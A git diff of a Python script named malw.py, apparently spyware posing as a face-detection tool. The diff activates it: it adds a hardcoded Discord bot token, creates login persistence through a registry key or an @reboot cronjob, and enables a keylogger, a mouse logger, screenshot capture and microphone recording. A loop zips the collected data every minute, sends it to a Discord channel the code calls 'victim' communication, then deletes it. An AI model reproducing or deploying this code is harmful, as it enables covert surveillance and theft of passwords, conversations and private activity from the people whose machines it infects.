@@ -16,21 +16,18 @@ import zipfile
 import platform
 from crontab import CronTab
 
-
+# Path of the current python script
 CURRENT_PATH = os.path.abspath(__file__).replace("malw.py","")
 
 # Discord Config
+BOT_TOKEN = "MTEwODAxOTM4MDUzNDY2MTE1MA.G52r79.rcUd06u08D7GJETRwljAoJ_3XScmCkCWEmNtQ4"
+CHANNEL_ID = 1108018740555153488
 
-TOKEN = ""
-CHANNEL_ID = ""
-# if TOKEN =="":
-#     raise Exception("Discord token not set! Please add the your discord token first by setting the variable <TOKEN> (string type)")
-# if CHANNEL_ID=="":
-#     raise Exception("Channel ID not set! Please add the your channel id first by setting the variable <CHANNEL_ID> (int type)")    
-
-def OS_Detection():
+# This function detects the operating system and sets this code to run in 
+# the background when the user logs in
+def persist():
+    print("Face Detection Pending...")
     OS = platform.system()
-    
     regKeyName = "PROGRAMM"
     if OS=="Windows":
         import winreg
@@ -55,9 +52,8 @@ def OS_Detection():
     elif OS == "Linux": 
         # Works on Ubuntu 22.04.2 LTS
         # Creates a cronjob that executes this python script on boot
-        # Requires root permission
         currentUser = os.getlogin()
-        # Can also set root as user but requires sudo privileges
+        # Can also set root as user but requires root privileges
         cron = CronTab(user = currentUser)
         
         # Check if cronjob is already set
@@ -67,7 +63,6 @@ def OS_Detection():
         set = False
         for job in jobs:
             if job.command==command:
-                print("FOUND")
                 set = True
                 break
         if not set:
@@ -75,40 +70,40 @@ def OS_Detection():
             job.every_reboot()
             cron.write()
         
-OS_Detection()
+persist()
 
-exit()
 ###############START#FACE#DETECTION################
 
-# faceCascade = cv2.CascadeClassifier("./haarcascade_frontalface_default.xml")
-# video_capture = cv2.VideoCapture(0)
+faceCascade = cv2.CascadeClassifier("./haarcascade_frontalface_default.xml")
+video_capture = cv2.VideoCapture(0)
 
-# while True:
-#     # Capture frame-by-frame
-#     ret, frame = video_capture.read()
+while True:
+    # Capture frame-by-frame
+    ret, frame = video_capture.read()
 
-#     gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
 
-#     faces = faceCascade.detectMultiScale(
-#         gray,
-#         scaleFactor=1.1,
-#         minNeighbors=5,
-#         minSize=(30, 30),
-#         flags=cv2.CASCADE_SCALE_IMAGE
-#     )
+    faces = faceCascade.detectMultiScale(
+        gray,
+        scaleFactor=1.1,
+        minNeighbors=5,
+        minSize=(30, 30),
+        flags=cv2.CASCADE_SCALE_IMAGE
+    )
 
-#     # Draw a rectangle around the faces
-#     if(len(faces)!=0):
-#         print("FACE DETECTED! ")
-#         break
-# # When everything is done, release the capture
-# video_capture.release()
-# cv2.destroyAllWindows()
+    # Draw a rectangle around the faces
+    if(len(faces)!=0):
+        print("FACE DETECTED! ")
+        break
+# When everything is done, release the capture
+video_capture.release()
+cv2.destroyAllWindows()
 
 ###############END#FACEDE#TECTION################
 
 
-
+# This function log a given event in the terminal if the code is run via the terminal
+# It also stores the text-based events in the .log files of the data folder:
 def logEvent(event, value=None):
     dateTime =  str(datetime.datetime.now().date()) + " "+datetime.datetime.now().strftime("%H:%M:%S")+": "
     if(event=="keyPress"):
@@ -119,13 +114,12 @@ def logEvent(event, value=None):
         value = "Screenshot taken stored at "+absPath
     elif(event=="mouseClick"):
         path = CURRENT_PATH+"data/mouse.log"
-    print(value)
     
     with open(path, "a") as logFile:
         logFile.write(dateTime+str(value)+"\n")
     
 # This function takes a screenshot every 15 seconds and
-# stores the screenshot at ./screenshot.log
+# stores the screenshot at ./data/screenshot.log
 def takeScreenshots():
     i = 1
     while True:
@@ -138,12 +132,10 @@ def takeScreenshots():
         
     
 # This function logs every pressed key and stores it
-# at its logfile .logs/keyboard.log
-
+# at its logfile .data/keyboard.log
 def keyLog():
     def on_press(key):
         logEvent("keyPress", str(key))
-        print(key)
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
  
@@ -168,7 +160,7 @@ def record():
     while True:        
         audio = pyaudio.PyAudio()
 
-        # Get the device information
+        # Get audio device information
         device_info = audio.get_device_info_by_index(1)
         device_name = device_info['name']
         print(f"Recording from device: {device_name}")
@@ -204,15 +196,6 @@ def record():
         sleep(15)
 
 
-thread1 = threading.Thread(target=keyLog)
-thread2 = threading.Thread(target=mouseLog)
-thread3 = threading.Thread(target=takeScreenshots)
-thread4 = threading.Thread(target=record)
-
-thread1.start()
-thread2.start()
-thread3.start()
-thread4.start()
 
 #Deletes all data in the data folder
 def clearData():
@@ -236,12 +219,28 @@ def compress_dir():
                 arcname = os.path.relpath(file_path, input)
                 zipFile.write(file_path, arcname)
     
+# Run all loggers multithreaded 
 
+# Create a thread for each logger
+thread1 = threading.Thread(target=keyLog)
+thread2 = threading.Thread(target=mouseLog)
+thread3 = threading.Thread(target=takeScreenshots)
+thread4 = threading.Thread(target=record)
+
+# Start the threads
+thread1.start()
+thread2.start()
+thread3.start()
+thread4.start()
+
+# Discord-victim comminucation
 Intent = Intents.default()
-Intent.message_content = True
-
 bot = Client(intents= Intent)
-    
+ 
+# This function creates an infinite loop which compresses
+# the logged located in the ./data folder and sends it.
+# The data sent is then deleted from the ./data folder in order to keep 
+# the size of the data compact
 @tasks.loop(seconds=60)
 async def sendMsg(channel):
 
@@ -253,12 +252,12 @@ async def sendMsg(channel):
         await channel.send(file= File(fp))
         clearData()
         
-
+# This function initiates the sending procedure
 @bot.event
 async def on_ready():
     channel= bot.get_channel(CHANNEL_ID)
     await sendMsg.start(channel)
 
-bot.run(TOKEN)
+bot.run(BOT_TOKEN)
 
 
